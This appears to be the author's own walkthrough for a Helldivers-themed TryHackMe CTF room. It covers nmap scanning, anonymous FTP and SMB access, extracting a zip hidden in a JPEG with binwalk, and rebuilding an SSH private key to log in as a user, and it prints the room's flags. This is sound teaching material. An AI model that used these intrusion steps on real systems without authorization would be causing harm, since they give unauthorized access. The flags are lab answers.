# Super Earth
### For Managed Democracy
"*The existence of high casualty missions implies the existence of low casualty missions, and we can take some solace in that*"

### General Information
Welcome to the **first CTF room** created by me :D<br>
I hope you will enjoy it as much as I enjoyed making it!

Link to the TryHackMe room: 

Attack machine IP: ????????????<br>
Target machine IP: ????????????

>As always, terminal output is cut down for brevity.

---
### Scanning the field
Let's begin. In order to find the objective, Helldivers have to scan the field and locate crucial assets:

```java
root@ip-10-113-94-131:~# nmap -sS 10.113.170.99
Host is up (0.000093s latency).
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
```

Let's check the specifics. Add these specific ports to your scan and use script and version scan

```java
root@ip-10-113-94-131:~# nmap -sC -sV 10.113.170.99 -p21,22 -n -Pn

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxr-xr-x    2 0        0            4096 Aug 25 15:09 fun
| -rw-r--r--    1 0        0          904912 Aug 25 15:09 helldivers.jpg
|_-rw-r--r--    1 0        0             274 Aug 25 15:09 malevelon_creek_orders.txt

22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.19 (Ubuntu Linux; protocol 2.0)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
root@ip-10-113-94-131:~# 
```
*Objective Located!*<br>
Clear as day, the Anonymous FTP login is **allowed** and there are files inside. That's our first clue.

For the newcomers, here is the explanation of the nmap flags:
- `-sC`: use default scripts; this way FTP login was automatically performed, with output shown in our terminal
- `-sV`: check service version; now we know that FTP server is on version 3.0.5 and OpenSSH on 9.6p1. These versions don't have known vulnerabilities that grant access to the system straight away (at least for now. Who knows what AI's gonna bring us?)
- `-p21,22`: scan only ports 21 and 22; script and version scans can take much more time if we don't provide specific ports
- `-n`: do not lookup reverse-DNS domain; totally optional, but a good practice
- `-Pn`: assume the server is up, don't send ICMP Echo; also a good practice if you know the server is up. It's more useful with Windows servers, but doesn't hurt to use here

---

### Main Objective: FTP
We already know it's open to anonymous connections. Connect to the FTP server and verify if it's really true.

pho1.png

Download all files to your Attack Machine. Use the `get` command. Changing directories and listing files works just the same as with Linux.
```
ftp> ls
drwxr-xr-x    2 0        0            4096 Aug 25 15:09 fun
-rw-r--r--    1 0        0          904912 Aug 25 15:09 helldivers.jpg
-rw-r--r--    1 0        0             274 Aug 25 15:09 malevelon_creek_orders.txt

ftp> cd fun
ftp> ls 
-rw-r--r--    1 0        0              58 Aug 25 15:09 play_me.txt

ftp> get play_me.txt
226 Transfer complete.

ftp> cd ..
250 Directory successfully changed.

ftp> get helldivers.jpg
226 Transfer complete.

ftp> get malevelon_creek_orders.txt
226 Transfer complete.

ftp> 
```
We have identified and retrieved three files:
- `play_me.txt` from the `fun` folder
- `helldivers.jpg`, a photo of the Helldivers team
- `malevelon_creek_orders.txt`, probably a clue to our task

*I'm a Helldiver, and I want to have fun!*
```
root@ip-10-113-94-131:~# cat play_me.txt 
more fun during our mission:
https://youtu.be/6VPn9jYm1QU
```
> Oh, so it's a fun addition to our missions. If you want to, you can blast it on your headphones :)

Helldivers.jpg? Should I put it in a frame and stare at it all day?!

pho2.png

> Seems fishy.. Why would there be a photo of our fellow comrades?

What do we have next..? Right! The orders!
```
root@ip-10-113-94-131:~# cat malevelon_creek_orders.txt 

         ===== Transmission from Super Earth Command =====

      This is mission control. 
      Helldiver, were you able to extract the sample 
                                   from the given resource?

    ============================================================
```
**Extract** the sample? **Given** resource? The only thing we have is the photo..

Maybe if we *walk* through that *bin*ary photo, the answer might come to us?

```
root@ip-10-113-94-131:~# binwalk helldivers.jpg 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, JFIF standard 1.01
904553        0xDCD69         Zip archive data, at least v2.0 to extract, compressed size: 171, uncompressed size: 238, name: uncommon_sample.txt
904890        0xDCEBA         End of Zip archive, footer length: 22
```
> Zip archive data, huh? Notice the text file name in Zip Description

All we have to do is to **extract** the resource. Just use the command:
```
binwalk -e helldivers.jpg --run-as=root
```
..and a folder with the sample has been created: `_helldivers.jpg.extracted`

pho3.png

The partial Helldivers communication has been received!<br>
Ah, so the Helldiver `john` was a participant on `Malevelon Creek`. Also, the order was to **SCAN** the **WHOLE** field. Maybe that's an another clue?

`Uncommon Sample Collected: THM{N0_P4In_NO_FR33D0M}`

---

### Scan the WHOLE field

```
root@ip-10-113-94-131:~# nmap -sS 10.113.170.99 -p- -n -Pn
Host is up (0.00011s latency).
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
17800/tcp open  unknown
```
what is it
```
root@ip-10-114-120-13:~/Downloads# nmap -sC -sV -O 10.114.143.187 -p17800
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-10-08 09:34 UTC
Nmap scan report for ip-10-114-143-187.eu-central-1.compute.internal (10.114.143.187)
Host is up (0.00028s latency).

PORT      STATE SERVICE     VERSION
17800/tcp open  netbios-ssn Samba smbd 4.6.2
```
> This one can take a bit longer, took me one minute on attackbox

list smb
```
root@ip-10-114-120-13:~# smbclient -L \\\\10.114.143.187\\anonymous -p 17800 --user=anonymous
Password for [WORKGROUP\anonymous]:

	Sharename       Type      Comment
	---------       ----      -------
	anonymous       Disk      The Voice of Freedom!
	IPC$            IPC       IPC Service (SUPPLY-DROP)
SMB1 disabled -- no workgroup available
root@ip-10-114-120-13:~# 
```
open smb
```
root@ip-10-114-120-13:~# smbclient \\\\10.114.143.187\\anonymous -p 17800 --user=anonymous
Password for [WORKGROUP\anonymous]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Sep 24 16:50:52 2026
  ..                                  D        0  Thu Sep 24 16:50:52 2026
  broken_id_rsa                       N     1718  Tue Aug 25 15:09:03 2026
  communication_scramble.heavy        N  5884196  Tue Aug 25 15:09:03 2026
  retrieval_orders.txt                N      463  Tue Aug 25 15:09:03 2026

		20463184 blocks of size 1024. 14489000 blocks available
smb: \> 
```
get  files
```
smb: \> get broken_id_rsa 
getting file \broken_id_rsa of size 1718 as broken_id_rsa (335.5 KiloBytes/sec) (average 335.5 KiloBytes/sec)
smb: \> get communication_scramble.heavy 
getting file \communication_scramble.heavy of size 5884196 as communication_scramble.heavy (140153.0 KiloBytes/sec) (average 124955.7 KiloBytes/sec)
smb: \> get retrieval_orders.txt 
getting file \retrieval_orders.txt of size 463 as retrieval_orders.txt (30.1 KiloBytes/sec) (average 94236.3 KiloBytes/sec)
smb: \> exit
```
see retrieval orders
```
root@ip-10-114-120-13:~/Downloads# cat retrieval_orders.txt 

        ===== Transmission from Super Earth Command =====

      Helldiver, we retrieved a secret key of a fellow friend. 
      It's impartial.
      Your task is to dig through the automatons comms 
                             and retrieve the remaining part!

      As to who the owner of the key was, that we do not know. 
      The key was damaged during the push of the Malevelon Creek. 

    ============================================================

```
dig through comms?
```
root@ip-10-114-120-13:~/Downloads# file communication_scramble.heavy 
communication_scramble.heavy: Unicode text, UTF-8 text
root@ip-10-114-120-13:~/Downloads# head communication_scramble.heavy -n 3
[AUTOMATON_BOB]: m:oq kzzzt zort d#gCb y^¶kQDW± ±)Nµ 2b_@h
[NODE]: ,▒E>e>0( ble]p 9Y▓Wof `_░Fh&*v± frack ¶H+IX▓
[KARL]: R`Uq~XL2 mnoq 0xcfd7 gT░▒&z 0x4a1f <TCP_FAIL> <CRC_FAIL> jolt
root@ip-10-114-120-13:~/Downloads# 
```
seems.. scrambled. What are we looking for? 
We have broken id_rsa. We probably need to look for something related to ID_RSA 
```
root@ip-10-114-120-13:~/Downloads# cat communication_scramble.heavy | grep -iE "rsa"
[AUTOMATON_BOB]: /yICS <CRC_FAIL> <TCP_FAIL> rSA 0xfb44 vzzzh <SIGNAL_LOST> wum; 0xfbab K|G840 g▓itch 0x2dd7 X±.J
[KARL]: 0xefdd h]rsae>G= kz§zt z&OjFkTb qu{x Zml} krik POd X>f32 Hut wump vorn
[UNKNOWN_SOURCE]: <FREQ_HOP> p`zt Y#4S`4:/A trsa vzzzh dU▒J▒4wVi bleep
[AUTOMATON_BOB]: I'M SENDING THE RSA BELOW
[LIGHTMAGICIAN]: 740|░n63Z kµzzt §}3BfiHrQ 0x72c5 plzt §u~▓F=o @eO!li|/S rSAI)µ =wWW5M4 <CRC_FAIL> <FREQ_HOP>
root@ip-10-114-120-13:~/Downloads# 
```
AUTOMATON_BOB sent the RSA! How do we access it?
```
root@ip-10-114-120-13:~/Downloads# cat communication_scramble.heavy | grep -iE "rsa below" --after-context=5
[AUTOMATON_BOB]: I'M SENDING THE RSA BELOW
[MISSION CONTROL]: [+2] Rare Sample Collected THM{SCR4M8LED_4UDI0_CH4NN3L_R4C0VER3D}
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn

[NODE]: B¶|wy_%_ quux ghor vzzzh flim kr!k
root@ip-10-114-120-13:~/Downloads# 

```
Note that I used "rsa below" and --after-context=5
Found Rare Sample!
Rare sample: `THM{SCR4M8LED_4UDI0_CH4NN3L_R4C0VER3D}`

and we have RSA. RSA is used for SSH login.
```
root@ip-10-114-120-13:~/Downloads# nano broken_id_rsa 
```
it should look like this (beginning)
```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAlWPZ2f0s7txeXWDIo6cC6T5FH36xF92Fmway2W4EmiB4Png8ttMJ
HH0XmHXwsC7SMb9ECag/2fgRM8fmiv+z2XXtHiSl2gbOXvZu1NS/uw5FC7PpyUqMuPvQww
```
Notice no spaces, empty lines, and BEGIN header should be there. Save with Ctrl+S and exit with Ctrl+X
Now I changed filename and permissions. Chmod 400 sets read access only for owner of the file
```
root@ip-10-114-120-13:~/Downloads# mv broken_id_rsa id_rsa
root@ip-10-114-120-13:~/Downloads# chmod 400 id_rsa
root@ip-10-114-120-13:~/Downloads# ls -hal id_rsa
-r-------- 1 root root 1.8K Oct  8 09:52 id_rsa
```
Let's try logging into SSH (id_rsa is for SSH). Remember the username? (Malevolen Creek orders)
```
root@ip-10-114-120-13:~/Downloads# ssh -i id_rsa john@10.114.143.187
The authenticity of host '10.114.143.187 (10.114.143.187)' can't be established.
ED25519 key fingerprint is SHA256:bhVyh02YYdYYAB0rct+t2fXuPibjhUlGPtb/riUNnnw.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
...

===============================================
            SUPER EARTH SALUTES YOU              
         Logged in as: John Helldiver            
===============================================

john@super-earth:~$ 

```

TADAAAAM. We are john helldiver.

### Sources
- Nmap
- FTP on Linux
- Binwalk
- SMB Client

